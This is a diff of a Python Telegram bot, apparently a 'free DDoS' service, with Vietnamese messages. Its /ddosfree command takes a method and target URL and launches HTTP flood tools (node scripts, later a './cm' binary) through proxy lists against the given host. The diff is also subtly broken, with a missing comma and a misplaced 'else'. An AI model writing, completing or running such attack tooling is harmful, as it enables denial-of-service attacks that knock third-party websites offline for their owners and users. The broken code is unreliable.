@@ -164,11 +164,8 @@ def aygspws(message):
 def methods(message):
     help_text = '''
 --- LAYER 7 ---
-BYPASS
 HTTP
 FLOOD
---- LAYER 4 ---
-TCP
 '''
     bot.reply_to(message, help_text)
 
@@ -220,15 +217,11 @@ def ddos_command(message):
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
     elif method == "http":
-        command = ["node", "flood.js", host, "120", "32", "20000", "proxy.txt"]
+        command = ["./cm", host, "-proxy", "proxy.txt" "hetb"]
     elif method == "flood":
-        command = ["node", "floodvietnam.js", host, "120", "20000", "20000", "proxy.txt", "flood"]
-    elif method == "bypass":
-        command = ["node", "floodvietnam.js", host, "120", "20000", "20000", "proxy.txt", "bypass"]
-    elif method == "tls":
-        command = ["node", "Linzz.js", host, "120", "32", "20000", "proxy.txt"]
-    else:
-        bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nbypass\ntls\nhttp\nHow to run /ddosfree <Method> <url>')
+        command = ["./cm", host, "-proxy", "proxy.txt", "-heta"]
+        else:
+        bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nhttp\nHow to run /ddosfree <Method> <url>')
         return
 
     cooldown_dict[username] = {'attack': current_time}
